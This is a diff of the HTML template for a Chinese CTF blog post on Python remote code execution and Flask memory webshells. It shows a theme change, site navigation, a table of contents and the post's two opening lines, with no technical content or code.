@@ -1,233 +1,362 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>python的RCE姿势以及内存马注入 | Blog of AyaN0</title><meta name="author" content="AyaN0"><meta name="copyright" content="AyaN0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="python的rce姿势以及内存马注入(未补完)python的SSTI是明白的，可是如果是先渲染再接受参数呢?只传参不渲染又该如何面对呢 诶，注入一个内存马试试.? Python 的命令执行不同于php自带的命令执行函数，python是要先引入模块的，参考jinja2模板注入找os内置函数的那个过程 OS模块经典款: os.system:可以用来执行系统命令,但是无法将系统命令执行的结果返回.如果">
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"ayan0.top","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.24.1","exturl":false,"sidebar":{"position":"left","width_expanded":280,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":false,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="python的rce姿势以及内存马注入(未补完) python的SSTI是明白的，可是如果是先渲染再接受参数呢?只传参不渲染又该如何面对呢 诶，注入一个内存马试试.?">
 <meta property="og:type" content="article">
 <meta property="og:title" content="python的RCE姿势以及内存马注入">
 <meta property="og:url" content="https://ayan0.top/2025/03/25/python%E7%9A%84RCE%E5%A7%BF%E5%8A%BF%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/">
 <meta property="og:site_name" content="Blog of AyaN0">
-<meta property="og:description" content="python的rce姿势以及内存马注入(未补完)python的SSTI是明白的，可是如果是先渲染再接受参数呢?只传参不渲染又该如何面对呢 诶，注入一个内存马试试.? Python 的命令执行不同于php自带的命令执行函数，python是要先引入模块的，参考jinja2模板注入找os内置函数的那个过程 OS模块经典款: os.system:可以用来执行系统命令,但是无法将系统命令执行的结果返回.如果">
+<meta property="og:description" content="python的rce姿势以及内存马注入(未补完) python的SSTI是明白的，可是如果是先渲染再接受参数呢?只传参不渲染又该如何面对呢 诶，注入一个内存马试试.?">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://ayan0.top/img/ari.webp">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325184321691.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325184555941.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325191600985.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325191725159.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325191538567.png">
 <meta property="article:published_time" content="2025-03-25T00:24:07.000Z">
 <meta property="article:modified_time" content="2025-07-15T03:35:31.252Z">
 <meta property="article:author" content="AyaN0">
 <meta property="article:tag" content="-Web -CTF">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://ayan0.top/img/ari.webp"><script type="application/ld+json">{
-  "@context": "https://schema.org",
-  "@type": "BlogPosting",
-  "headline": "python的RCE姿势以及内存马注入",
-  "url": "https://ayan0.top/2025/03/25/python%E7%9A%84RCE%E5%A7%BF%E5%8A%BF%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/",
-  "image": "https://ayan0.top/img/ari.webp",
-  "datePublished": "2025-03-25T00:24:07.000Z",
-  "dateModified": "2025-07-15T03:35:31.252Z",
-  "author": [
-    {
-      "@type": "Person",
-      "name": "AyaN0",
-      "url": "https://ayan0.top/"
-    }
-  ]
-}</script><link rel="shortcut icon" href="/img/logo.png"><link rel="canonical" href="https://ayan0.top/2025/03/25/python%E7%9A%84RCE%E5%A7%BF%E5%8A%BF%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
-    (() => {
-      
-    const saveToLocal = {
-      set: (key, value, ttl) => {
-        if (!ttl) return
-        const expiry = Date.now() + ttl * 86400000
-        localStorage.setItem(key, JSON.stringify({ value, expiry }))
-      },
-      get: key => {
-        const itemStr = localStorage.getItem(key)
-        if (!itemStr) return undefined
-        const { value, expiry } = JSON.parse(itemStr)
-        if (Date.now() > expiry) {
-          localStorage.removeItem(key)
-          return undefined
-        }
-        return value
-      }
-    }
+<meta name="twitter:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325184321691.png">
 
-    window.btf = {
-      saveToLocal,
-      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
-        const script = document.createElement('script')
-        script.src = url
-        script.async = true
-        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
-        script.onload = script.onreadystatechange = () => {
-          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
-        }
-        script.onerror = reject
-        document.head.appendChild(script)
-      }),
-      getCSS: (url, id) => new Promise((resolve, reject) => {
-        const link = document.createElement('link')
-        link.rel = 'stylesheet'
-        link.href = url
-        if (id) link.id = id
-        link.onload = link.onreadystatechange = () => {
-          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
-        }
-        link.onerror = reject
-        document.head.appendChild(link)
-      }),
-      addGlobalFn: (key, fn, name = false, parent = window) => {
-        if (!true && key.startsWith('pjax')) return
-        const globalFn = parent.globalFn || {}
-        globalFn[key] = globalFn[key] || {}
-        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
-        parent.globalFn = globalFn
-      }
-    }
+
+<link rel="canonical" href="https://ayan0.top/2025/03/25/python%E7%9A%84RCE%E5%A7%BF%E5%8A%BF%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://ayan0.top/2025/03/25/python%E7%9A%84RCE%E5%A7%BF%E5%8A%BF%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/","path":"2025/03/25/python的RCE姿势以及内存马注入/","title":"python的RCE姿势以及内存马注入"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>python的RCE姿势以及内存马注入 | Blog of AyaN0</title>
   
-      
-      const activateDarkMode = () => {
-        document.documentElement.setAttribute('data-theme', 'dark')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
-        }
-      }
-      const activateLightMode = () => {
-        document.documentElement.setAttribute('data-theme', 'light')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
-        }
-      }
 
-      btf.activateDarkMode = activateDarkMode
-      btf.activateLightMode = activateLightMode
 
-      const theme = saveToLocal.get('theme')
-    
-          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+      <img class="custom-logo-image" src="/images/lly.jpg" alt="Blog of AyaN0">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Blog of AyaN0</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
         
-      
-      const asideStatus = saveToLocal.get('aside-status')
-      if (asideStatus !== undefined) {
-        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
-      }
-    
-      
-    const detectApple = () => {
-      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
-        document.documentElement.classList.add('apple')
-      }
-    }
-    detectApple()
   
-    })()
-  </script><script>const GLOBAL_CONFIG = {
-  root: '/',
-  algolia: undefined,
-  localSearch: undefined,
-  translate: undefined,
-  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
-  copy: {
-    success: '复制成功',
-    error: '复制失败',
-    noSupport: '浏览器不支持'
-  },
-  relativeDate: {
-    homepage: false,
-    post: false
-  },
-  runtime: '',
-  dateSuffix: {
-    just: '刚刚',
-    min: '分钟前',
-    hour: '小时前',
-    day: '天前',
-    month: '个月前'
-  },
-  copyright: undefined,
-  lightbox: 'null',
-  Snackbar: undefined,
-  infinitegrid: {
-    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
-    buttonText: '加载更多'
-  },
-  isPhotoFigcaption: false,
-  islazyloadPlugin: false,
-  isAnchor: false,
-  percent: {
-    toc: true,
-    rightside: false,
-  },
-  autoDarkmode: false
-}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
-  title: 'python的RCE姿势以及内存马注入',
-  isHighlightShrink: false,
-  isToc: true,
-  pageType: 'post'
-}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/mea3.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/ari.webp" onerror="this.onerror=null;this.src='/img/dacapo.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/ari.webp" alt="Logo"><span class="site-name">Blog of AyaN0</span></a><a class="nav-page-title" href="/"><span class="site-name">python的RCE姿势以及内存马注入</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">python的RCE姿势以及内存马注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-25T00:24:07.000Z" title="发表于 2025-03-25 08:24:07">2025-03-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-15T03:35:31.252Z" title="更新于 2025-07-15 11:35:31">2025-07-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="python的rce姿势以及内存马注入-未补完"><a href="#python的rce姿势以及内存马注入-未补完" class="headerlink" title="python的rce姿势以及内存马注入(未补完)"></a>python的rce姿势以及内存马注入(未补完)</h1><p>python的SSTI是明白的，可是如果是先渲染再接受参数呢?只传参不渲染又该如何面对呢</p>
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#python%E7%9A%84rce%E5%A7%BF%E5%8A%BF%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E6%9C%AA%E8%A1%A5%E5%AE%8C"><span class="nav-number">1.</span> <span class="nav-text"> python的rce姿势以及内存马注入(未补完)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#python-%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">1.1.</span> <span class="nav-text"> Python 的命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#os%E6%A8%A1%E5%9D%97"><span class="nav-number">1.1.1.</span> <span class="nav-text"> OS模块</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ossystem"><span class="nav-number">1.1.1.1.</span> <span class="nav-text"> os.system:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ospopen"><span class="nav-number">1.1.1.2.</span> <span class="nav-text"> os.popen:</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#subprocess%E6%A8%A1%E5%9D%97"><span class="nav-number">1.1.2.</span> <span class="nav-text"> subprocess模块</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#subprocessrun"><span class="nav-number">1.1.2.1.</span> <span class="nav-text"> subprocess.run:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#subprocesspopen"><span class="nav-number">1.1.2.2.</span> <span class="nav-text"> subprocess.Popen</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#subprocessgetoutput"><span class="nav-number">1.1.2.3.</span> <span class="nav-text"> subprocess.getoutput</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#subprocesscheck_output"><span class="nav-number">1.1.2.4.</span> <span class="nav-text"> subprocess.check_output</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#subprocesscall-%E5%8F%8Acheck_call"><span class="nav-number">1.1.2.5.</span> <span class="nav-text"> subprocess.call() 及check_call()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#send_file"><span class="nav-number">1.1.3.</span> <span class="nav-text"> send_file</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#eval%E5%92%8Cexec"><span class="nav-number">1.1.4.</span> <span class="nav-text"> eval和exec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#commands"><span class="nav-number">1.1.5.</span> <span class="nav-text"> commands</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ctypes"><span class="nav-number">1.1.6.</span> <span class="nav-text"> ctypes</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#threading"><span class="nav-number">1.1.7.</span> <span class="nav-text"> threading</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#multiprocessing"><span class="nav-number">1.1.7.1.</span> <span class="nav-text"> multiprocessing</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#_posixsubprocess"><span class="nav-number">1.1.7.2.</span> <span class="nav-text"> _posixsubprocess</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pty"><span class="nav-number">1.1.7.3.</span> <span class="nav-text"> pty</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#timeit"><span class="nav-number">1.1.7.4.</span> <span class="nav-text"> timeit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#platform"><span class="nav-number">1.1.7.5.</span> <span class="nav-text"> platform</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#importlib"><span class="nav-number">1.1.7.6.</span> <span class="nav-text"> importlib</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sys"><span class="nav-number">1.1.7.7.</span> <span class="nav-text"> sys</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#linecache"><span class="nav-number">1.1.7.8.</span> <span class="nav-text"> linecache</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#builtins"><span class="nav-number">1.1.7.9.</span> <span class="nav-text"> builtins</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">1.1.7.10.</span> <span class="nav-text"> 反弹shell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flask-rce%E5%88%A9%E7%94%A8%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87"><span class="nav-number">1.2.</span> <span class="nav-text"> Flask RCE利用(内存马篇)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#static_folder-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">1.2.1.</span> <span class="nav-text"> static_folder 任意文件读取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%AF%E7%94%B1%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.2.</span> <span class="nav-text"> 路由注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flask-rce%E5%88%A9%E7%94%A8debug%E7%AF%87"><span class="nav-number">1.3.</span> <span class="nav-text"> Flask RCE利用(debug篇)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E8%BE%85%E5%8A%A9%E5%B7%A5%E4%BD%9C"><span class="nav-number">1.4.</span> <span class="nav-text"> 一些辅助工作</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="AyaN0"
+      src="/images/lly.jpg">
+  <p class="site-author-name" itemprop="name">AyaN0</p>
+  <div class="site-description" itemprop="description">不断的前进的人:只有0次摔倒或无数次的爬起</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/kisakiayano" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;kisakiayano" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1594453512@qq.com" title="E-Mail → 1594453512@qq.com" rel="noopener me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ayan0.top/2025/03/25/python%E7%9A%84RCE%E5%A7%BF%E5%8A%BF%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lly.jpg">
+      <meta itemprop="name" content="AyaN0">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Blog of AyaN0">
+      <meta itemprop="description" content="不断的前进的人:只有0次摔倒或无数次的爬起">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="python的RCE姿势以及内存马注入 | Blog of AyaN0">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          python的RCE姿势以及内存马注入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-03-25 08:24:07" itemprop="dateCreated datePublished" datetime="2025-03-25T08:24:07+08:00">2025-03-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-07-15 11:35:31" itemprop="dateModified" datetime="2025-07-15T11:35:31+08:00">2025-07-15</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>8.6k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>16 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="python的rce姿势以及内存马注入未补完"><a class="markdownIt-Anchor" href="#python的rce姿势以及内存马注入未补完"></a> python的rce姿势以及内存马注入(未补完)</h1>
+<p>python的SSTI是明白的，可是如果是先渲染再接受参数呢?只传参不渲染又该如何面对呢</p>
 <p>诶，注入一个内存马试试.?</p>
